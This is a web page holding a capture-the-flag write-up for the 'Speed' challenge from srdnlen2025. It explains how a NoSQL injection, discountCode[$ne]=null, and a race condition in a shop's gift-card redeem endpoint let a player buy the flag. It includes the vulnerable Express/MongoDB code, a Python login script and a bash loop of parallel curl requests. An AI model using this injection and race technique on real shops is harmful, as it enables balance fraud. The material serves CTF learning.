               

<!DOCTYPE html>
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    

    <title>Speed - ByteTheCookies</title>

    

    

    
    <meta name="author" content="ByteTheCookies" />
    

    
        <meta property="og:title" content="Speed" />
<meta property="og:description" content="Speed Description: Welcome to Radiator Springs&rsquo; finest store, where every car enthusiast&rsquo;s dream comes true! But remember, in the world of racing, precision matters‚Äîso tread carefully as you navigate this high-octane experience. Ka-chow!
Introduction For the second web challenge of srdnlen2025 we have a very interesting but not particularly complicated challenge.
The challenge is presented as a simple shop, so the goal is to buy the flag, which has a very high price." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/srdnlen2025/speed/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2025-03-11T17:20:39+01:00" />
<meta property="article:modified_time" content="2025-03-11T18:29:57+01:00" />


    

    
        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Speed"/>
<meta name="twitter:description" content="Speed Description: Welcome to Radiator Springs&rsquo; finest store, where every car enthusiast&rsquo;s dream comes true! But remember, in the world of racing, precision matters‚Äîso tread carefully as you navigate this high-octane experience. Ka-chow!
Introduction For the second web challenge of srdnlen2025 we have a very interesting but not particularly complicated challenge.
The challenge is presented as a simple shop, so the goal is to buy the flag, which has a very high price."/>
<meta name="twitter:site" content="@ByteTheCookies"/>

    <link rel="stylesheet" href="/style.css" integrity="">



    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">



    
        <script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
></script>
<script>
  MathJax = {
    tex: {
      displayMath: [
        ["\\[", "\\]"],
        ["$$", "$$"],
      ], 
      inlineMath: [
        ["\\(", "\\)"],
        ["$", "$"],
      ], 
    },
  };
</script>

    

    
    <script>
        if (!('theme' in localStorage)) {
            localStorage.theme = 'dark';
        }

        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
            document.documentElement.setAttribute("data-theme", "dark");
        } else {
            document.documentElement.setAttribute("data-theme", "light");
        }
    </script>
<script defer src="/js/header.js" integrity=""></script>



    <script defer src="/js/zooming.js" integrity=""></script>







    
        

        
        

        
        
            
        

        <script defer src="/js/prism.js" integrity="" data-manual></script>
    



    
    
    
    <script defer src="/js/search-en.js" integrity=""></script>




<link rel="stylesheet" href="http://localhost:1313/user.css">

    

</head>
<body><header>
    <div id="header_left">
        <div id="sidebar_btn">
            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
            <label id="sidebar_btn_label" for="sidebar_btn_input">
                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
</svg>

</svg>
            </label>
            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
                <div id="sidebar_canvas_overlay"></div>
            </label>
            <div id="sidebar">
                <ul><li>
                            <a href="/">üíª About</a></li><li>
                            <a href="/news/">üì∞ News</a></li><li>
                            <a href="/writeups/">üìë Writeups</a></li><li>
                            <a href="/contacts/">‚úâÔ∏è Contacts</a></li></ul>
            </div>
        </div>
    
        <div class="brand">
            <div>
                <a href="/">ByteTheCookies</a>
            </div>
        </div>
    </div>

    <div class="toolbox">
        <div id="theme_tool">
            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
</svg>

</svg>
            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
</svg>

</svg>
        </div>

        
            <div id="search_tool">
                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>

</svg><div id="search_menu_wrapper" class="hidden">
    <div id="search_menu">
        <div id="search_menu_toolbar">
            <div id="search_menu_input_wrapper">
                <input id="search_menu_input" type="text" placeholder='Search Posts'>
            </div>
            <div id="search_menu_close_btn">
                <svg width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
</svg>

</svg>
            </div>
        </div>
        <div id="search_menu_results">
        </div>
    </div>
</div>
</div>
        

        
    </div>
</header>
<nav id="navbar" class="pure-menu">
    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
                    
                        <a href="/" class="pure-menu-link">üíª About</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/news/" class="pure-menu-link">üì∞ News</a>
                    
                </li><li class="navbar-item pure-menu-item insection">
                    
                        <a href="/writeups/" class="pure-menu-link">üìë Writeups</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/contacts/" class="pure-menu-link">‚úâÔ∏è Contacts</a>
                    
                </li></ul>
</nav>
<main>
      <div id="content" class="content-margin">
        
    
    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#source">Source</a></li>
    <li><a href="#solution">Solution</a></li>
  </ul>
</nav>
        
    </div></details>



<div class="tags">
  
    <div class="badge">Web</div>

  
    <div class="badge">javascript</div>

  
    <div class="badge">NoSQLI</div>

  
    <div class="badge">Race Condition</div>

  
    <div class="badge">Octaviusss</div>

  
</div>

<div>
  <p class="date">
    Last edit: Mar 11, 2025
  </p>
</div>


    <div class="content-margin">



<article >
    
    
        
        
    
    <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Speed</h1>
<p><strong>Description</strong>: Welcome to Radiator Springs&rsquo; finest store, where every car enthusiast&rsquo;s dream comes true! But remember, in the world of racing, precision matters‚Äîso tread carefully as you navigate this high-octane experience. Ka-chow!</p>

<h2>Introduction</h2>

<p>For the second web challenge of srdnlen2025 we have a very interesting but not particularly complicated challenge.</p>
<p>The challenge is presented as a simple shop, so the goal is to buy the flag, which has a very high price. and we don&rsquo;t have enough money to buy the flag, which is particularly standard.</p>
<p>So we jump straight into the code and try to understand how it works.</p>

<h2>Source</h2>

<p>The application is a simple javascript application using express.js and express-handlebars for page rendering and a nosql database to manage the data (MongoDB with mongoose).</p>
<p><img alt="screen" src="/images/speed/img1.png"></p>
<p>As soon as we log in, we notice that the only way to get money is with these codes, which are randomly generated once in the code and cannot be reused.</p>
<pre  class="mc-prism hide language-text" ><code class="language-javascript">// filename: app.js
// Generate a random discount code
  const generateDiscountCode = () =&gt; {
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let discountCode = '';
      for (let i = 0; i &lt; 12; i++) {
          discountCode += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return discountCode;
  };

    const createDiscountCodes = async () =&gt; {
        const discountCodes = [
            { discountCode: generateDiscountCode(), value: 20 }
        ];

        for (const code of discountCodes) {
            const existingCode = await DiscountCodes.findOne({ discountCode: code.discountCode });
            if (!existingCode) {
                await DiscountCodes.create(code);
                console.log(`Inserted discount code: ${code.discountCode}`);
            } else {
                console.log(`Discount code ${code.discountCode} already exists.`);
            }
        }
    };

    // Call function to insert discount codes
    await createDiscountCodes();
</code></pre>
<p>As you can see, everything is normal, nothing strange, something strange we have in the routes.js in the redeem endpoint.</p>
<pre  class="mc-prism hide language-text" ><code class="language-javascript">
let delay = 1.5;

router.get('/redeem', isAuth, async (req, res) =&gt; {
    try {
        const user = await User.findById(req.user.userId);

        if (!user) {
            return res.render('error', { Authenticated: true, message: 'User not found' });
        }

        // Now handle the DiscountCode (Gift Card)
        let { discountCode } = req.query;

        if (!discountCode) {
            return res.render('error', { Authenticated: true, message: 'Discount code is required!' });
        }

        const discount = await DiscountCodes.findOne({discountCode})

        if (!discount) {
            return res.render('error', { Authenticated: true, message: 'Invalid discount code!' });
        }

        // Check if the voucher has already been redeemed today
        const today = new Date();
        const lastRedemption = user.lastVoucherRedemption;

        if (lastRedemption) {
            const isSameDay = lastRedemption.getFullYear() === today.getFullYear() &amp;&amp;
                              lastRedemption.getMonth() === today.getMonth() &amp;&amp;
                              lastRedemption.getDate() === today.getDate();
            if (isSameDay) {
                return res.json({success: false, message: 'You have already redeemed your gift card today!' });
            }
        }

        // Apply the gift card value to the user's balance
        const { Balance } = await User.findById(req.user.userId).select('Balance');
        user.Balance = Balance + discount.value;
        // Introduce a slight delay to ensure proper logging of the transaction
        // and prevent potential database write collisions in high-load scenarios.
        new Promise(resolve =&gt; setTimeout(resolve, delay * 1000));
        user.lastVoucherRedemption = today;
        await user.save();

        return res.json({
            success: true,
            message: 'Gift card redeemed successfully! New Balance: ' + user.Balance // Send success message
        });

    } catch (error) {
        console.error('Error during gift card redemption:', error);
        return res.render('error', { Authenticated: true, message: 'Error redeeming gift card'});
    }
});
</code></pre>
<p>The first thing that stands out is</p>
<pre  class="mc-prism hide language-text" ><code class="language-javascript">
        const user = await User.findById(req.user.userId);

        if (!user) {
            return res.render('error', { Authenticated: true, message: 'User not found' });
        }

        // Now handle the DiscountCode (Gift Card)
        let { discountCode } = req.query;

        if (!discountCode) {
            return res.render('error', { Authenticated: true, message: 'Discount code is required!' });
        }

        const discount = await DiscountCodes.findOne({discountCode})

        if (!discount) {
            return res.render('error', { Authenticated: true, message: 'Invalid discount code!' });
        }
</code></pre>
<p>Where we can clearly see a very undisguised nosql injection where we just have to do <code>discountCode = { $ne: null }</code> to redeem the code without knowing the exact value.</p>
<p>But this only solves one of our problems, because when we check the code later we see that our code can only be used once, the code only gives 20 credits and we need 50 credits for the flag.</p>
<p>This is where the name of the challenge comes in, which gives a nice clue as to what to do next, <strong>speed</strong> == <strong>race condition</strong>.</p>

<h2>Solution</h2>

<p>In my case, I split the attack into two parts because I had problems doing the race condition in python, so I used curl and bash, but there may be a more elegant way to exploit the race condition.</p>
<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py

import random
import string
import threading
import requests

# BASE_URL = &quot;http://speed.challs.srdnlen.it:8082&quot;
BASE_URL = &quot;http://localhost:80&quot;
s = requests.Session()

def string_generator(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def redeem_code():
    try:
        r = s.get(BASE_URL + &quot;/redeem?discountCode[$ne]=null&quot;)
        print(f&quot;Response ({threading.current_thread().name}): {r.status_code} - {r.text}&quot;)
    except Exception as e:
        print(f&quot;Error in thread {threading.current_thread().name}: {e}&quot;)

def login(username, password):
    s.post(BASE_URL + &quot;/user-login&quot;, json={&quot;username&quot;: username, &quot;password&quot;: password})
    # print(f&quot;Login response: {r.text}&quot;)
    return username, password

def register(username, password):
    s.post(BASE_URL + &quot;/register-user&quot;, json={&quot;username&quot;: username, &quot;password&quot;: password})
    # print(f&quot;Register response: {r.text}&quot;)
    return username, password

def main():
    username = string_generator(8)
    password = string_generator(8)
    register(username, password)
    login(username, password)

    print(s.cookies[&quot;jwt&quot;].strip())
    # redeem_code()


if __name__ == &quot;__main__&quot;:
    main()

</code></pre>
<pre  class="mc-prism hide language-text" ><code class="language-bash">#!/bin/bash

JWT=&quot;$(python3 exploit.py)&quot;      # Read the jwt printed by exploit.py
echo &quot;JWT used: $JWT&quot;

for i in {1..30}; do
  curl -s 'http://localhost:80/redeem?discountCode%5B%24ne%5D=null' \
       -H &quot;Cookie: jwt=${JWT}&quot; &amp;
done

wait

</code></pre>
<p>Once you have made a few attempts and the logs show that you have 60 credits, you can copy the jwt and use it to log in.</p>
<p align='right'>Author: akiidjk </p>

</article>
</div>
   
      </div>
    </main>
<footer>
    <article>Copyright ¬© 2024 by ByteTheCookies Team | v1.0</article>
</footer>

</body>
</html>
